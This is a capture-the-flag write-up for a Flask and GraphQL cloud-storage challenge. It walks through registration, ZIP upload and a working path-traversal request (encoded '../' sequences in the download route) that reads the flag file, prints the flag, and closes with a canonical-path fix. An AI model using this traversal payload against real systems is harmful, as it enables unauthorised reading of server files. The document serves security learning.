# Ramadan CloudVault — Write-up

## Challenge Info
- **Instance:** `ctf.vulnbydefault.com:17578`
- **Category:** Web
- **Date solved:** 26 Feb 2026

## Summary
The application is a Flask-based cloud storage site with GraphQL authentication and ZIP upload/extraction functionality.

The key bug is a **path traversal** in the file download route:

- Route: `/zip/<filename>/download/<path:filepath>`
- Server logic builds the file path with `os.path.join(UPLOAD_DIR, stem, filepath)`
- It does **not** normalize and enforce that the resulting path stays inside the extracted ZIP directory
- This allows reading arbitrary files on disk via encoded `../` sequences

## Recon Notes
1. Landing page and headers showed a Flask/Werkzeug app.
2. Login page revealed GraphQL endpoint: `/api/graphql`.
3. GraphQL introspection exposed mutations:
   - `registerUser(username, password)`
   - `loginUser(username, password)`
4. After creating a user and logging in, dashboard allowed ZIP upload and exposed:
   - `/zip/<zipname>`
   - `/zip/<zipname>/download/<path>`

## Exploitation
### 1) Register and log in
```bash
curl -sS http://ctf.vulnbydefault.com:17578/api/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"mutation { registerUser(username:\"ctfplayer\", password:\"ctfplayer123\") { success message } }"}'

curl -sS -c /tmp/cv.cookies -b /tmp/cv.cookies \
  http://ctf.vulnbydefault.com:17578/api/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"mutation { loginUser(username:\"ctfplayer\", password:\"ctfplayer123\") { success message } }"}'
```

### 2) Upload any ZIP
```bash
mkdir -p /tmp/cvtest
echo hello > /tmp/cvtest/a.txt
cd /tmp/cvtest
zip -q sample.zip a.txt

curl -sS -b /tmp/cv.cookies -c /tmp/cv.cookies \
  -F 'zipfile=@/tmp/cvtest/sample.zip;type=application/zip' \
  http://ctf.vulnbydefault.com:17578/upload -i
```

### 3) Exploit traversal in download endpoint
```bash
curl -sS -b /tmp/cv.cookies \
  'http://ctf.vulnbydefault.com:17578/zip/sample.zip/download/..%2f..%2f..%2f..%2fflag.txt'
```

## Flag
```txt
VBD{z1p_sl1p_1s_fun_adb2c482c74dadf66562129c16748893}
```

## Root Cause
Missing canonical path validation before `send_file()` in the ZIP download handler.

A secure fix should:
1. Resolve canonical path with `realpath()` / `Path.resolve()`
2. Enforce the resolved file path is under the expected extraction directory
3. Reject traversal attempts (`../`, encoded variants) with 403/404
